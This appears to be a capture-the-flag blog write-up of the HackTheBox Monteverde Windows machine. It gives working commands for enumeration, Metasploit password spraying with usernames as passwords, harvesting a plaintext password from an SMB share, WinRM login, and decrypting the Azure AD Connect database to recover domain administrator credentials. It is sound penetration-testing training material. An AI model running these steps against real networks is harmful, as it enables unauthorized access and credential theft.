---
title: Write-up Monteverde Machine
author: pcw3r
date: 2020-06-13 11:33:00 +0800
categories: [HackTheBox, Boot2Root]
tags: [WINDOWS, MEDIUM, ENUMERATION, ACTIVE-DIRECTORY EXPLOITATION, LAZY-PASSWORD, AZURE EXPLOITATION]
math: true
---

**<center>RefÂ°: HTB-08-Boot2Root</center>**

![Desktop View]({{ "/assets/img/monteverde/HTB-Badge-Monteverde.png" | relative_url }})

--- Monteverde is a Windows machine that highlights the weakness of a password (lazy password) after a first enumeration and the presence of a password in the SMB service to get our flag user.

A privilege escalation is possible when our user is in Azure Admins security group to perform an attack through AD Azure Connect service to get flag root.

![Desktop View]({{ "/assets/img/monteverde/HTB-Information-Monteverde.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Check all services
***
We find interesting services `dns`, `kerberos`, `ldap` and `smb` on their usual ports.

```terminal
$ nmap -A -T5 10.10.10.172 -p-
```

### Enumerate Samba service from enum4linux
***
Enum4linux is a tool for enumerating information from Windows and Samba systems.

We find users : `Administrator, Guest, AAD_987d7f2f57d2, mhope, SABatchJobs, svc-ata, svc-bexec, svc-netapp, dgalanos, roleary, smorgan`

And interesting group Azure Admins with 3 members.

```terminal
$ enum4linux 10.10.10.172
```

```
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
.......
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
```

## **<span style='color:#c0392b'>[2] Foothold - Get into the target </span>**
### Using Lazy Password 
***

We have much possitiblity to exploit Active-Directory Machine.

Reference - Active-Directory exploit toolbox : <https://github.com/infosecn1nja/AD-Attack-Defense/blob/master/README.md>

But longer enumeration and kerberos attack give me nothing. In this situation we're gonna try `lazy passwords`.

Let's see with smb_login module in Metasploit and set true the `USER_AS_PASS`.

```terminal
$ msfconsole
msf5 > search smb_login
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set SMBDomain MEGABANK.LOCAL
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE /root/Documents/writeups/monteverde/userfile.txt
msf5 auxiliary(scanner/smb/smb_login) > set USER_AS_PASS true
msf5 auxiliary(scanner/smb/smb_login) > set rhosts 10.10.10.172
msf5 auxiliary(scanner/smb/smb_login) > exploit
```
Result : `Success: 'megabank.local\SABatchJobs:SABatchJobs'`


## **<span style='color:#c0392b'>[3] Lateral Movement - Move through environment</span>**
### Plaintext Password from conf file
***

We enum with SABatchJobs on smb service.

```terminal
$ smbmap -u SABatchJobs -p SABatchJobs -H 10.10.10.172
$ mount -t cifs //10.10.10.172/users$ share_users -o username=SABatchJobs,password=SABatchJobs
```

We find file in user folder `azure.xml` with a plaintext password : `4n0therD4y@n0th3r$`
This xml seems to be created by azure cmdlet to create password for the user mhope with -AsPlainText attribut.

![Desktop View]({{ "/assets/img/monteverde/HTB-Images-Monteverde-PasswordMhope.png" | relative_url }})


### Remote Service WinRM login
***

We can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).

WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.

Reference - evil-winrm tool : <https://github.com/Hackplayers/evil-winrm>

```terminal
$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

### Flag user
***

We flag the user to validate the compromission of the system user.

Result the flag : 4961976bd7d8f4eeb2ce3705e2f212f2


## **<span style='color:#c0392b'>[4] Privilege Escalation - Gain higher-level permissions</span>**
### Azure ADConnect Database exploitation
***

We identified an interesting group at the beginning Azure Admins.
Here our user Mhope belongs to this group : Global Group Memberships Azure Admins

```terminal
PS c:\Users\mhope\Documents> net users mhope
```

After research to find any exploit through group Azure Admins, i finally found the exploitation to compromise Monteverde Machine through the database of Azure ADConnect Service.

Reference - exploit : <https://blog.xpnsec.com/azuread-connect-for-redteam/>

Azure AD Connect is the service installed within the Active Directory environment. It is responsible for syncing and communicating with Azure AD and is what the majority of this post will focus on.

From mhope user we have the ability to extract credential of the account (with the necessary right to perform DCSync Attack) which served during the installation of Azure AD Connect through the decryption of the value encrypted_configuration in the database ADSync.

To do this we use the script of a hackthebox player made available on github : <https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1>

This script is based on the POC created by XPN but with a modification in the ArgumentList to pass when we execute it.
The script then becomes more flexibility.

The decrypted password for the account which served during the installation of Azure AD Connect will be revealed : `d0m@in4dminyeah!`

```terminal
PS C:\Users\mhope\Documents> menu
PS C:\Users\mhope\Documents> Azure-ADConnect -server 10.10.10.172 -db ADSYNC
```
Result :
[+] Domain:  MEGABANK.LOCAL
[+] Username: administrator
[+]Password: d0m@in4dminyeah!


### Remote Service WinRM login
***

Here the account is administrator, so we dont need to perform DCSync Attack.

We can connect with evil winrm and grab the flag root to valide the compromission of the mahine.

```terminal
$ evil-winrm -i 10.10.10.172 -u Administrator -p 'd0m@in4dminyeah!'
```

### Flag root
***

Result : 12909612d25c8dcf6e5a07d1a804a0bc

***

## **<center>Trophy</center>**

> **They might call it the cloud but it is, in fact, just someone else's computer.**
>
> Mark Russinovich
